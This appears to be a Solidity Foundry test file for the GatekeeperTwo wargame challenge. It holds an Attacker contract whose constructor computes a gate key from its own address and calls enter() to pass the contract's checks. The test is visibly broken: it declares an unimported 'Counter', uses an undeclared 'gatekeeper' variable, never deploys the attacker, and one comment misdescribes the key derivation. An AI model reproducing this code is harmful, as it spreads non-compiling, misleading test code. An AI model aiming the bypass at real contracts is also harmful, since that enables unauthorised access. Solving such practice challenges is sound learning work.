// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
    Counter public counter;

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6655846);
    }

    function test_Increment() public {
        // 验证 entrant 是否被正确设置为 tx.origin
        assertEq(gatekeeper.entrant(), tx.origin);
    }

}

contract Attacker {
    GatekeeperTwo gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperTwo(_gatekeeper);
        
        // 构造符合 gateThree 的 _gateKey
        bytes8 _gateKey = calculateGateKey();

        // 调用 enter 函数
        gatekeeper.enter(_gateKey);
    }

    function calculateGateKey() internal view returns (bytes8) {
        // 获取 keccak256(abi.encodePacked(msg.sender)) 的前 8 字节
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        return gateKey;
    }
}